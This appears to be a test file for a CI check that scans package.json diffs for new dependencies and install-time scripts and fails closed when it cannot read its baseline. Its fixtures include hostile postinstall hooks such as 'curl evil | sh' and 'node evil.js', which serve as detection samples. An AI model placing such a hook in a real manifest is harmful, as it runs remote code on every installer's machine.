// Self-test for the dependency-diff check (BIN-1088).
//
// Run: npm test
//
// What has to be pinned here, and why the fail-closed cases outnumber the
// finding cases: this check runs on a path into main that no review gate reaches.
// If it goes green when it could not read its baseline, the merge looks
// reviewed and is not. "I could not look" and "I looked and found nothing" must
// never share an exit code, so every branch that cannot complete is driven here
// and asserted red.

import { describe, test, expect } from 'vitest';
import {
  MANIFESTS,
  INSTALL_TIME_SCRIPTS,
  assertRefReachable,
  readManifest,
  findingsForManifest,
  findFindings,
  main,
} from './check-dependency-diff.mjs';

/**
 * A stand-in for git. `trees` maps a ref to the files that ref holds; a ref
 * absent from `trees` is unresolvable, which is the distinction the whole
 * fail-closed contract rests on.
 */
function fakeGit(trees) {
  return (args) => {
    if (args[0] === 'rev-parse') {
      const ref = args[3].replace(/\^\{commit\}$/, '');
      if (!(ref in trees)) throw new Error(`bad ref ${ref}`);
      return '';
    }
    if (args[0] === 'ls-tree') {
      const ref = args[2];
      const path = args[4];
      const tree = trees[ref];
      if (!tree) throw new Error(`bad ref ${ref}`);
      return path in tree ? path + '\n' : '';
    }
    if (args[0] === 'show') {
      const [ref, path] = args[1].split(/:(.*)/s);
      const tree = trees[ref];
      if (!tree || !(path in tree)) throw new Error(`bad path ${path}`);
      return tree[path];
    }
    throw new Error(`unexpected git ${args.join(' ')}`);
  };
}

const json = (o) => JSON.stringify(o, null, 2);

describe('the failure set', () => {
  test('a plain version bump of an existing dependency is not a finding', () => {
    const before = { present: true, json: { dependencies: { next: '16.0.0' } } };
    const after = { present: true, json: { dependencies: { next: '16.0.1' } } };
    expect(findingsForManifest('package.json', before, after)).toEqual([]);
  });

  test('a new install-time script is a finding, and a plain script is not', () => {
    const before = { present: true, json: { scripts: { build: 'next build' } } };
    const after = {
      present: true,
      json: { scripts: { build: 'next build', postinstall: 'node evil.js', lint: 'eslint .' } },
    };
    const found = findingsForManifest('package.json', before, after);
    expect(found).toHaveLength(1);
    expect(found[0]).toMatchObject({ kind: 'install-script', name: 'postinstall' });
  });

  test('every name in INSTALL_TIME_SCRIPTS is actually detected', () => {
    // Without this the constant could be trimmed to one entry and every test
    // above would stay green — the silent-shrink shape of BIN-838/850.
    expect(INSTALL_TIME_SCRIPTS.length).toBeGreaterThanOrEqual(4);
    for (const key of INSTALL_TIME_SCRIPTS) {
      const found = findingsForManifest(
        'package.json',
        { present: true, json: { scripts: {} } },
        { present: true, json: { scripts: { [key]: 'x' } } },
      );
      expect(found.map((f) => f.name)).toEqual([key]);
    }
  });

  test('a script that was ALREADY there is not re-reported on a later bump', () => {
    const both = { scripts: { prepare: 'husky' } };
    expect(
      findingsForManifest('package.json', { present: true, json: both }, { present: true, json: both }),
    ).toEqual([]);
  });

  test('a promotion out of devDependencies is reported as such, not as a new package', () => {
    const found = findingsForManifest(
      'functions/package.json',
      { present: true, json: { devDependencies: { typescript: '5.0.0' } } },
      { present: true, json: { dependencies: { typescript: '5.0.0' } } },
    );
    expect(found).toHaveLength(1);
    expect(found[0]).toMatchObject({ kind: 'dev-to-prod', name: 'typescript' });
  });

  test('a package that was in neither block is a new dependency', () => {
    const found = findingsForManifest(
      'package.json',
      { present: true, json: { dependencies: { next: '16.0.0' } } },
      { present: true, json: { dependencies: { next: '16.0.0', 'left-pad': '1.0.0' } } },
    );
    expect(found).toHaveLength(1);
    expect(found[0]).toMatchObject({ kind: 'new-dependency', name: 'left-pad' });
  });

  test('a NEW devDependency alone is not a finding', () => {
    expect(
      findingsForManifest(
        'package.json',
        { present: true, json: { devDependencies: {} } },
        { present: true, json: { devDependencies: { vitest: '3.0.0' } } },
      ),
    ).toEqual([]);
  });
});

describe('a manifest that appears or disappears', () => {
  test('a manifest absent at the base has every dependency treated as new', () => {
    const found = findingsForManifest(
      'functions/package.json',
      { present: false },
      { present: true, json: { dependencies: { a: '1', b: '2' }, scripts: { postinstall: 'x' } } },
    );
    expect(found.map((f) => f.name).sort()).toEqual(['a', 'b', 'postinstall']);
  });

  test('readManifest reports absent for a path the ref does not hold', () => {
    // Drives the presence branch through the real function rather than through a
    // hand-made `{ present: false }`. Without it, a readManifest that answers
    // "present" for everything passes the whole file.
    const git = fakeGit({ HEAD: { 'package.json': json({}) } });
    expect(readManifest('HEAD', 'functions/package.json', { git })).toEqual({ present: false });
    expect(readManifest('HEAD', 'package.json', { git }).present).toBe(true);
  });

  test('a manifest deleted at the head has nothing left to check', () => {
    expect(
      findingsForManifest(
        'functions/package.json',
        { present: true, json: { dependencies: { a: '1' } } },
        { present: false },
      ),
    ).toEqual([]);
  });
});

describe('fail closed', () => {
  test('an unresolvable base ref throws rather than reporting a clean diff', () => {
    const git = fakeGit({ HEAD: { 'package.json': json({}) } });
    expect(() => assertRefReachable('origin/main', { git })).toThrow(/cannot resolve/);
    expect(() => findFindings('origin/main', 'HEAD', { git })).toThrow(/cannot resolve/);
  });

  test('an unresolvable HEAD throws too', () => {
    const git = fakeGit({ 'origin/main': { 'package.json': json({}) } });
    expect(() => findFindings('origin/main', 'HEAD', { git })).toThrow(/cannot resolve/);
  });

  test('main() exits 1 when the base ref cannot be resolved', () => {
    const lines = [];
    const code = main(['origin/main', 'HEAD'], {
      git: fakeGit({ HEAD: {} }),
      log: () => {},
      err: (m) => lines.push(m),
    });
    expect(code).toBe(1);
    expect(lines.join('\n')).toMatch(/could not complete the check/);
  });

  test('a manifest that will not parse exits 1 instead of reading as empty', () => {
    const git = fakeGit({
      'origin/main': { 'package.json': json({ dependencies: {} }) },
      HEAD: { 'package.json': '{ this is not json' },
    });
    expect(() => readManifest('HEAD', 'package.json', { git })).toThrow();
    const code = main(['origin/main', 'HEAD'], { git, log: () => {}, err: () => {} });
    expect(code).toBe(1);
  });

  test('a missing base argument exits 1', () => {
    // The fake must hold a resolvable HEAD. With an empty one the assertion passes
    // even when the argv guard is deleted, because the ref main() would fall back to
    // fails its own reachability check — right answer, wrong reason.
    const git = fakeGit({ HEAD: { 'package.json': json({ dependencies: {} }) } });
    expect(main([], { git, log: () => {}, err: () => {} })).toBe(1);
  });

  test('a read that fails on a path the ref DOES hold exits 1, not clean', () => {
    // The fail-open this check exists to avoid. Deciding presence by catching the
    // read made "no such path" and "the read broke" the same answer, and on the head
    // side that answer short-circuits to a green report. ls-tree says the path is
    // there; the read still throws.
    const trees = {
      'origin/main': { 'package.json': json({ dependencies: {} }) },
      HEAD: { 'package.json': json({ dependencies: { 'left-pad': '1.0.0' } }) },
    };
    const inner = fakeGit(trees);
    const git = (args) => {
      if (args[0] === 'show' && args[1].startsWith('HEAD:')) throw new Error('object is corrupt');
      return inner(args);
    };
    const out = [];
    const code = main(['origin/main', 'HEAD'], { git, log: (m) => out.push(m), err: (m) => out.push(m) });
    expect(code).toBe(1);
    expect(out.join('\n')).not.toMatch(/OK/);
  });
});

describe('main() end to end', () => {
  const clean = {
    'origin/main': {
      'package.json': json({ dependencies: { next: '16.0.0' } }),
      'functions/package.json': json({ dependencies: { 'firebase-admin': '12.0.0' } }),
    },
    HEAD: {
      'package.json': json({ dependencies: { next: '16.0.1' } }),
      'functions/package.json': json({ dependencies: { 'firebase-admin': '12.0.1' } }),
    },
  };

  test('a routine two-manifest version bump is green', () => {
    const out = [];
    const code = main(['origin/main', 'HEAD'], {
      git: fakeGit(clean),
      log: (m) => out.push(m),
      err: (m) => out.push(m),
    });
    expect(code).toBe(0);
    expect(out.join('\n')).toMatch(/OK/);
  });

  test('a postinstall smuggled into functions/ is red and names the file', () => {
    const trees = structuredClone(clean);
    trees.HEAD['functions/package.json'] = json({
      dependencies: { 'firebase-admin': '12.0.1' },
      scripts: { postinstall: 'curl evil | sh' },
    });
    const out = [];
    const code = main(['origin/main', 'HEAD'], {
      git: fakeGit(trees),
      log: (m) => out.push(m),
      err: (m) => out.push(m),
    });
    expect(code).toBe(1);
    expect(out.join('\n')).toContain('functions/package.json');
    expect(out.join('\n')).toContain('postinstall');
  });

  test('both manifests are read, not just the first', () => {
    // Drop the root manifest from the check and this test still passes on the
    // functions finding alone, so the roster is asserted against the source of
    // truth rather than against whichever file the fixture happens to use.
    expect(MANIFESTS).toContain('package.json');
    expect(MANIFESTS).toContain('functions/package.json');
    const seen = [];
    const git = (args) => {
      if (args[0] === 'show') seen.push(args[1]);
      return fakeGit(clean)(args);
    };
    findFindings('origin/main', 'HEAD', { git });
    for (const path of MANIFESTS) {
      expect(seen).toContain(`origin/main:${path}`);
      expect(seen).toContain(`HEAD:${path}`);
    }
  });
});
